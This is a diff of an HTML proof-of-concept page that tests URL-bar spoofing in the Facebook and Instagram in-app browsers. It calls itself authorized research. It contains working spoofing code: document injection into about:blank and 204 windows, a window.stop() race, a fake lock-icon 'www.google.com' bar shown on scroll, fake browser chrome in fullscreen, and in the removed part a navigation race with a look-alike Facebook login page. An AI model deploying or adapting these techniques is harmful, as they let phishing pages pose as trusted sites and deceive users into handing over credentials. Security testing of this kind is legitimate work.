@@ -2,103 +2,122 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <title>google.com</title>
 <style>
- body{font-family:-apple-system,system-ui,Arial,sans-serif;padding:16px;line-height:1.5;color:#111}
- a#test{font-size:18px;color:#1877f2}
- pre{background:#f4f4f7;border:1px solid #dcdce2;border-radius:6px;padding:8px;font-size:11px;white-space:pre-wrap;word-break:break-all}
- .warn{color:#b23;font-size:12px}
+ :root{--line:#dcdce2;--card:#f4f4f7}
+ *{box-sizing:border-box}
+ body{margin:0;font-family:-apple-system,system-ui,Arial,sans-serif;line-height:1.45;color:#111}
+ .wrap{max-width:520px;margin:auto;padding:14px}
+ h1{font-size:17px}h2{font-size:13px;margin:16px 0 4px}
+ p{font-size:13px;color:#666}
+ code{background:var(--card);padding:1px 5px;border-radius:4px;font-size:12px;word-break:break-all}
+ .diag{background:var(--card);border:1px solid var(--line);border-radius:10px;padding:12px;margin:8px 0;font-size:12px}
+ button{font-size:14px;padding:11px;margin:4px 0;width:100%;border:1px solid var(--line);border-radius:9px;background:#fff;text-align:left}
+ button:active{background:var(--card)}
+ input{width:100%;padding:10px;font-size:16px;border:1px solid var(--line);border-radius:9px;margin:5px 0}
+ .log{font-size:11px;color:#777;white-space:pre-wrap;margin-top:4px}
+ .warn{color:#b23;font-size:11px}
+ /* scroll-redress fake bar */
+ #fakebar{position:fixed;left:50%;transform:translateX(-50%);min-width:180px;height:40px;padding:0 16px;
+   background:#ececef;display:none;align-items:center;justify-content:center;gap:6px;border:1px solid var(--line);
+   border-radius:20px;box-shadow:0 1px 6px rgba(0,0,0,.14);z-index:9999;font-size:15px;color:#000}
+ #fakebar.top{top:6px}#fakebar.bottom{bottom:8px}
+ .spacer{height:150vh}
+ /* fullscreen fake chrome */
+ #fc{display:none;position:fixed;inset:0;z-index:999999;background:#fff;flex-direction:column}
+ #fcbar{height:50px;background:#f2f2f7;border-bottom:1px solid var(--line);display:flex;align-items:center;justify-content:center;gap:8px;font-size:16px}
+ #fcbody{flex:1;display:flex;align-items:center;justify-content:center;text-align:center;padding:20px}
 </style>
 </head>
 <body>
- <p>Authorized benign PoC — navigation-race / optimistic-URL spoof. Tap the link:</p>
- <p style="font-size:12px;color:#666">race target (URL asli yang di-nav berulang) + interval (ms):</p>
- <input id="hang" value="https://web.facebook.com/" style="width:100%;padding:9px;font-size:15px;border:1px solid #dcdce2;border-radius:8px;margin:4px 0">
- <input id="ms" value="20" style="width:100%;padding:9px;font-size:15px;border:1px solid #dcdce2;border-radius:8px;margin:4px 0">
- <a id="test" href="https://web.facebook.com/" onclick="foo();return false;">https://web.facebook.com/</a>
- <pre id="log">log:</pre>
- <p class="warn">Benign: NO credentials are read or stored. Proof = attacker page shown while bar shows facebook.com.</p>
+<div id="fakebar" class="bottom"><span style="font-size:12px;opacity:.7">🔒</span><span>www.google.com</span></div>
+
+<div class="wrap">
+ <h1>FB/IG in-app — spoof suite (benign)</h1>
+ <p>Authorized research. Neutral markers only (no credential forms). Each technique tries to make the
+    in-app URL bar show a trusted host while THIS attacker content stays. Compare bar vs real origin.
+    The navigation-race class is patched; these are OTHER classes.</p>
+ <div class="diag" id="diag"></div>
+ <input id="victim" value="https://www.google.com/">
+
+ <h2>1 · 204 / about:blank inheritance</h2>
+ <button onclick="t204()">open 204 endpoint &amp; inject benign marker</button>
+ <div class="log" id="l1"></div>
+
+ <h2>2 · hanging-port + window.stop()</h2>
+ <button onclick="tStop()">open victim:8443 (hang) + stop + rewrite</button>
+ <div class="log" id="l2"></div>
+
+ <h2>3 · scroll-collapse UI redress (fake bar)</h2>
+ <p>scroll down → fake "🔒 www.google.com" pill appears over the chrome.</p>
+ <button onclick="togglePos()">toggle fake bar top/bottom</button>
+
+ <h2>4 · iframe URI-scheme (bar confusion)</h2>
+ <button onclick="ifr('geo:0,0')">iframe geo:</button>
+ <button onclick="ifr('tel:')">iframe tel: <span class="warn">(may prompt — cancel)</span></button>
+ <button onclick="ifr('maps://?q=0,0')">iframe maps://</button>
+ <div class="log" id="l4"></div>
+
+ <h2>5 · slow real resource (optimistic URL)</h2>
+ <button onclick="tSlow()">open victim slow/large resource, keep bar</button>
+ <div class="log" id="l5"></div>
+
+ <h2>6 · fullscreen fake chrome</h2>
+ <button onclick="fsEnter()">enter fullscreen + draw fake bar</button>
+ <div class="log" id="l6"></div>
+
+ <p class="diag"><b>Verdict:</b> SPOOF if the bar shows google.com (or the victim host) while this
+    page's benign content stays visible and the real origin below is not that host.</p>
+ <p class="warn">Test on your own device. Long-domain truncation needs hosting at a long subdomain (use brave_longdomain_spoof.html separately).</p>
+</div>
+<div class="spacer"></div>
+
+<div id="fc"><div id="fcbar"><span style="font-size:12px;opacity:.7">🔒</span><span>www.google.com</span></div>
+ <div id="fcbody"><div><h2 style="color:#c00">BENIGN SPOOF TEST</h2><p>Real bar hidden? Fake bar convincing?</p></div></div></div>
 
 <script>
- var w, t, z, i, iframe;
- function log(m){try{var L=document.getElementById('log');if(L)L.textContent=m+'\n'+L.textContent;}catch(e){}}
+ function g(id){return document.getElementById(id);}
+ g('diag').innerHTML='real origin = <code>'+location.origin+'</code><br>UA FB='+/FBAN|FBAV/i.test(navigator.userAgent)+' IG='+/Instagram/i.test(navigator.userAgent);
+ function victim(){return (g('victim').value||'https://www.google.com/').trim();}
+ function host(){return victim().replace(/^https?:\/\//,'').replace(/\/.*$/,'');}
+ function benign(tag){return '<!doctype html><meta name=viewport content="width=device-width,initial-scale=1">'+
+   '<body style="font-family:Arial;text-align:center;padding:30px"><h1 style="color:#c00">BENIGN SPOOF TEST</h1>'+
+   '<p>technique: '+tag+'</p><p>attacker-origin content; bar should NOT say a trusted host.</p>'+
+   '<pre id=o style="font-size:11px;background:#f3f3f3;padding:8px;border-radius:6px;text-align:left"></pre>'+
+   '<scr'+'ipt>document.getElementById("o").textContent="href="+location.href+"\\norigin="+(location.origin||"(opaque)")+"\\ndomain="+document.domain;<\/scr'+'ipt>';}
 
- // ?fake  ->  render a BENIGN look-alike (no credential capture)
- if (location.href.indexOf("fake") !== -1) {
-   document.title = "Facebook - Masuk";
-   document.body.innerHTML = `<!DOCTYPE html><html lang="id"><head><meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Facebook - Masuk</title>
-<style>*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}
-body{background:#fff;color:#1c1e21;line-height:1.34}.container{max-width:480px;margin:0 auto;padding:20px;min-height:100vh;display:flex;flex-direction:column;justify-content:space-between}
-header{text-align:center;margin-bottom:40px}.banner{background:#fff3cd;border:1px solid #ffe08a;color:#7a5b00;font-size:13px;padding:10px;border-radius:6px;margin-bottom:20px}
-.logo{width:90px;height:90px;margin:0 auto 30px;background:#1877f2;border-radius:50%;display:flex;align-items:center;justify-content:center;color:#fff;font-size:60px;font-weight:bold}
-form{background:#fff;padding:20px;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1),0 8px 16px rgba(0,0,0,.1)}
-input{width:100%;padding:14px 16px;margin-bottom:12px;border:1px solid #dddfe2;border-radius:6px;font-size:16px}
-.login-btn{width:100%;padding:14px;background:#1877f2;color:#fff;font-size:18px;font-weight:bold;border:none;border-radius:6px;margin:16px 0}
-#proof{font-size:11px;color:#b23;word-break:break-all;margin-top:12px}
-footer{text-align:center;margin-top:40px;font-size:14px;color:#8a8d91}</style></head>
-<body><div class="container"><div>
-<header>
- <div class="banner"><b>BENIGN SPOOF TEST</b><br>This page is <span id="realorigin"></span><br>NOT https://web.facebook.com/ &mdash; check the address bar above.</div>
- <div class="logo">f</div>
-</header>
-<form id="loginForm">
- <input type="text" id="username" placeholder="Mobile number or Email">
- <input type="password" id="password" placeholder="Password">
- <button type="submit" class="login-btn">Login</button>
- <div id="proof"></div>
-</form>
-</div><footer><span>&#8734; Meta</span></footer></div>
-<script>
- document.getElementById('realorigin').textContent = location.origin + location.pathname;
- document.getElementById('loginForm').addEventListener('submit', function(ev){
-   ev.preventDefault();
-   // BENIGN: never read/store the password. Prove the spoof via origin only.
-   document.getElementById('proof').textContent =
-     'BENIGN SPOOF TEST — no credentials captured. If the bar shows web.facebook.com while this is ' +
-     'origin=' + location.origin + ' domain=' + document.domain + '  =>  address-bar spoof confirmed.';
- });
-<\/script></body></html>`;
- }
+ function t204(){ var t=window.open('https://www.google.com/csi','_blank'); if(!t){g('l1').textContent='popup blocked';return;}
+   setTimeout(function(){ try{ t.document.open(); t.document.write(benign('204')); t.document.close(); g('l1').textContent='injected — check new tab bar vs origin'; }
+     catch(e){ try{ t.eval('document.write('+JSON.stringify(benign('204'))+');document.close()'); g('l1').textContent='injected via eval'; }catch(e2){ g('l1').textContent='blocked: '+e2.message; }
+ } },700); }
 
- function raceUrl(){ var v=document.getElementById('hang'); return (v&&v.value||'https://web.facebook.com/').trim(); }
- function raceMs(){ var v=document.getElementById('ms'); return Math.max(5, parseInt((v&&v.value)||'20',10)||20); }
- var navigated=false, racer=null;
+ function tStop(){ var t=window.open('about:blank','_blank'); if(!t){g('l2').textContent='popup blocked';return;}
+   try{t.document.write(benign('stop'));t.document.close();}catch(e){}
+   setTimeout(function(){ try{ t.location.href='https://'+host()+':8443/'; }catch(e){}
+     setTimeout(function(){ try{t.stop&&t.stop();}catch(e){} try{t.document.write(benign('stop-rewrite'));t.document.close();}catch(e){} g('l2').textContent='stopped+rewrote — check bar'; },40); }
+,300); }
 
- function foo(){
-   navigated=false;
-   if(racer){ clearInterval(racer); racer=null; }
-   document.getElementById("test").href = "#";
-   w = window.open("?fake");
-   if(!w){ log('popup blocked — FB/IG may block window.open'); return; }
-   log('opened child ?fake. waiting for attacker content…');
-   t = setInterval(step, 50);
- }
+ function ifr(scheme){ var f=document.createElement('iframe'); f.style.cssText='width:1px;height:1px;border:0';
+   f.srcdoc="<script>setTimeout(function(){try{location.href='"+scheme.replace(/'/g,"\\'")+"'}catch(e){}},300)<\/scr"+"ipt>";
+   document.body.appendChild(f); g('l4').textContent='fired iframe '+scheme+' — watch bar (real origin '+location.origin+')'; }
 
- function step(){
-   try{
-     // same-origin while child is on ?fake; readable until we navigate away
-     if (!navigated && w.location.href.indexOf('about:blank') === -1){
-       navigated = true;
-       clearInterval(t);
-       var u = raceUrl(), ms = raceMs();
-       log('attacker content up. CONTINUOUS nav-race -> ' + u + ' every ' + ms + 'ms');
-       // re-issue navigation faster than it can commit: each tick updates the bar to
-       // the target (optimistic) then is canceled by the next tick before the new
-       // document can paint -> attacker content never replaced, bar stays on target.
-       racer = setInterval(function(){ try{ w.location.href = u; }catch(e){} }, ms);
-       // auto-stop after 20s so it doesn't run away; spoof is "stable while race runs".
-       setTimeout(function(){
-         if(racer){ clearInterval(racer); racer=null;
-           log('race stopped (20s). If bar stayed facebook & content stayed attacker during the race = SPOOF.'); }
-       }, 20000);
-     }
-   }catch(e){
-     clearInterval(t);
-     log('child became cross-origin (stopped polling)');
-   }
- }
+ function tSlow(){ var t=window.open('about:blank','_blank'); if(!t){g('l5').textContent='popup blocked';return;}
+   try{t.document.write(benign('slow'));t.document.close();}catch(e){}
+   setTimeout(function(){ try{ t.location.href='https://'+host()+'/csi?'+Date.now(); }catch(e){} g('l5').textContent='navigated to victim resource — if bar shows '+host()+' while content stays = s
+poof'; },300); }
+
+ // scroll-redress
+ var fb=g('fakebar'); window.addEventListener('scroll',function(){ fb.style.display=(window.scrollY>40)?'flex':'none'; },{passive:true});
+ function togglePos(){ if(fb.classList.contains('bottom')){fb.classList.remove('bottom');fb.classList.add('top');}else{fb.classList.remove('top');fb.classList.add('bottom');} }
+
+ // fullscreen
+ function fsEnter(){ var el=document.documentElement; var rfs=el.requestFullscreen||el.webkitRequestFullscreen;
+   if(rfs){ try{ var p=rfs.call(el); if(p&&p.then){p.then(fsShow).catch(function(e){g('l6').textContent='fs rejected: '+e;fsShow();});} else setTimeout(fsShow,100);}catch(e){g('l6').textContent='f
+s err '+e;fsShow();} }
+   else { g('l6').textContent='no fullscreen API'; fsShow(); } }
+ function fsShow(){ g('fc').style.display='flex'; g('l6').textContent='fullscreen active='+!!(document.fullscreenElement||document.webkitFullscreenElement)+' — real bar hidden? fake bar convincing
+?'; }
 </script>
 </body>
 </html>
